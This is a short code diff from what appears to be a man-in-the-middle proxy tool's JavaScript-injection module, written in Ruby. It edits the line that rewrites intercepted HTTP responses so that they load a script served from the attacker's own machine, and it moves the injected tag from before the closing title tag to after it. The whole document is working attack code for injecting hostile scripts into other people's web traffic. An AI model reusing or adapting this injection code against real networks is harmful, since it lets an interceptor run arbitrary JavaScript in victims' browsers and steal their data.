@@ -135,7 +135,7 @@ class InjectJS < Proxy::Module
       localaddr = Context.get.iface[:ip_saddr]
       localport = Context.get.options[:httpd_port]
       # inject the js
-      response.body.sub!( '</title>', "<script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script></title>" )
+      response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script>" )
     end
   end
 end
